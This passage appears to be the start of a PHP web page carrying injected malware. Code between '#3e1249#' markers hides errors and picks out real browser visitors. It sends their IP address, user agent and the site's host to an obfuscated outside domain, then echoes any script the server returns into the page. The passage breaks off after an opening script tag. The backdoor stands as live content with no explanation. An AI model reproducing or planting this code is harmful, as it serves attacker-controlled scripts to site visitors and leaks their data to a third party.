...
<?php
#3e1249#
error_reporting(0); @ini_set('display_errors',0); $wp_v484 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_v484) && !preg_match ('/bot/i', $wp_v484))){
$wp_v09484="http://"."web"."https".".com/"."web"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_v484);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_v09484); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_484v = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_484v = @file_get_contents($wp_v09484);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_484v=@stream_get_contents(@fopen($wp_v09484, "r"));}}
if (substr($wp_484v,1,3) === 'scr'){ echo $wp_484v; }
#/3e1249#
?>
<script type="text/javascript">
